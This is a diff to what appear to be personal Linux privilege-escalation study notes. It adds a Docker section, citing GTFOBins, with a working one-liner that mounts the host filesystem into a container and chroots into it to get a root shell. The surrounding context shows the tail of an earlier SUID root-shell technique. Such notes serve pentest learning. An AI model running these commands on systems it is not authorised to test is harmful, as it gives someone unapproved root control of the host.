@@ -521,7 +521,18 @@ chmod +s /tmp/mountme/exploit
 # escalate to our root shell
 /tmp/exploit
 ```
-# Escalation Path: Docker
+# Escalation Path: Docker ([GTFOBins - Docker](https://gtfobins.github.io/gtfobins/docker/))
+## Summary
+Members of the docker group can utilize docker to run bash as root
+
+## Enumeration
+User must have privileges to run docker (ie, be in the `docker` group) or root
+
+## Exploitation
+Call bash via docker
+```
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+```
 
 # todo
 - [ ] Continue on Escalation Path: Other SUID Escalation/Escalation via Shared Object
